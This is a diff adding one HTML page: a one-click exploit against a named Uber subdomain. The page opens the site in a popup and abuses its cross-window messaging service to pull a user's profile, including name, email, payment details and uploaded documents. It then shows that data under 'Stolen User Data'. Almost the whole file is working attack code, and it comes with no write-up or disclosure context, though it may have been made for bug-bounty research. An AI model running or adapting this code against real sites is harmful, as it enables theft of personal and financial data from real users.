@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple Uber PostMessage Exploit</title>
+    <style>
+        body {
+            font-family: monospace;
+            max-width: 1400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #1a1a1a;
+            color: #0f0;
+        }
+        h1 { color: #f66; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+        .container { display: flex; gap: 20px; margin-top: 20px; }
+        .panel {
+            flex: 1;
+            background: #2a2a2a;
+            border: 2px solid #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .panel h2 { color: #ffd700; margin-top: 0; }
+        button {
+            background: #f66;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 10px 5px;
+        }
+        button:hover { background: #ff5252; }
+        button:disabled { background: #666; cursor: not-allowed; }
+        pre {
+            background: #000;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 3px;
+            overflow-x: auto;
+            font-size: 11px;
+        }
+        .service-item {
+            background: #333;
+            padding: 8px;
+            margin: 5px 0;
+            border-left: 3px solid #ffd700;
+        }
+        .service-name { color: #ffd700; font-weight: bold; }
+        .method-count { color: #0f0; font-size: 12px; }
+        .status { padding: 5px 10px; border-radius: 3px; display: inline-block; margin-left: 10px; }
+        .status.ready { background: #0f0; color: #000; }
+        .status.waiting { background: #ff0; color: #000; }
+    </style>
+</head>
+<body>
+    <h1>🔓 Uber PostMessage Exploit - One Click</h1>
+    
+    <div>
+        <button id="exploitBtn" onclick="autoExploit()">💀 AUTO EXPLOIT (Open + Steal All Data)</button>
+        <span id="status" class="status waiting">Ready to exploit</span>
+    </div>
+
+    <div class="container">
+        <div class="panel">
+            <h2>📡 Discovered Services</h2>
+            <div id="services">Waiting for exploit...</div>
+        </div>
+        
+        <div class="panel">
+            <h2>💎 Stolen User Data</h2>
+            <div id="userData">Waiting for exploit...</div>
+        </div>
+    </div>
+
+<script>
+const TARGET = "https://earn-uberaisolutions.uber.com";
+let targetWindow = null;
+let services = {};
+
+function autoExploit() {
+    document.getElementById('exploitBtn').disabled = true;
+    document.getElementById('status').textContent = 'Opening target...';
+    
+    // Step 1: Open popup
+    targetWindow = window.open(TARGET, 'uber', 'width=1200,height=800');
+    
+    if (!targetWindow) {
+        alert('Popup blocked! Enable popups and try again.');
+        document.getElementById('exploitBtn').disabled = false;
+        return;
+    }
+    
+    // Step 2: Wait for load, then discover services
+    setTimeout(() => {
+        document.getElementById('status').textContent = 'Discovering services...';
+        targetWindow.postMessage({
+            type: "REQUEST_CLIENT_PORT",
+            channel: "service-discovery",
+            requestID: "discover"
+        }, TARGET);
+    }, 3000);
+}
+
+window.addEventListener('message', (e) => {
+    if (e.origin !== TARGET) return;
+    
+    if (e.ports && e.ports[0]) {
+        const port = e.ports[0];
+        const reqID = e.data.requestID;
+        
+        port.onmessage = (pe) => handleResponse(pe, reqID);
+        port.start();
+        
+        if (reqID === "discover") {
+            // Get service list
+            setTimeout(() => port.postMessage({type: "LIST_PROVIDERS"}), 500);
+        } else if (reqID === "exploit-profile") {
+            // Steal profile data (Format 3 that worked!)
+            document.getElementById('status').textContent = 'Exfiltrating data...';
+            setTimeout(() => {
+                port.postMessage({type: "fetchProfileData", requestID: "steal"});
+            }, 500);
+        }
+    }
+});
+
+function handleResponse(event, source) {
+    const data = event.data;
+    
+    // Handle service list
+    if (data.payload && Array.isArray(data.payload)) {
+        document.getElementById('status').textContent = 'Services discovered!';
+        document.getElementById('status').className = 'status ready';
+        
+        let html = '';
+        data.payload.forEach(svc => {
+            services[svc.type] = svc;
+            html += `
+                <div class="service-item">
+                    <div class="service-name">${svc.type}</div>
+                    <div class="method-count">${svc.methodsList ? svc.methodsList.length : 0} methods</div>
+                </div>
+            `;
+        });
+        document.getElementById('services').innerHTML = html;
+        
+        // Now connect to profile service
+        const profileSvc = data.payload.find(s => s.type === "f7-kwm-profile-management-service-provider");
+        if (profileSvc) {
+            setTimeout(() => {
+                targetWindow.postMessage({
+                    type: "REQUEST_CLIENT_PORT",
+                    channel: profileSvc.channelName,
+                    requestID: "exploit-profile"
+                }, TARGET);
+            }, 1000);
+        }
+    }
+    
+    // Handle stolen data
+    if (data.requestID === "steal" && data.payload) {
+        document.getElementById('status').textContent = 'DATA STOLEN!';
+        document.getElementById('status').style.background = '#f66';
+        
+        const profile = data.payload.userProfile || {};
+        const docs = profile.profileDocuments || [];
+        
+        let html = `<pre>${JSON.stringify({
+            Name: profile.firstName + " " + profile.lastName,
+            Email: profile.email,
+            Country: profile.countryIso2Code,
+            Payment: profile.paymentDetails,
+            ProfileID: profile.profileId,
+            Documents: docs.map(d => ({
+                file: d.originalFileName,
+                uri: d.fileUri,
+                type: d.category
+            })),
+            FullData: data.payload
+        }, null, 2)}</pre>`;
+        
+        document.getElementById('userData').innerHTML = html;
+        
+        console.log('🔥 STOLEN DATA:', data.payload);
+    }
+}
+</script>
+</body>
+</html>
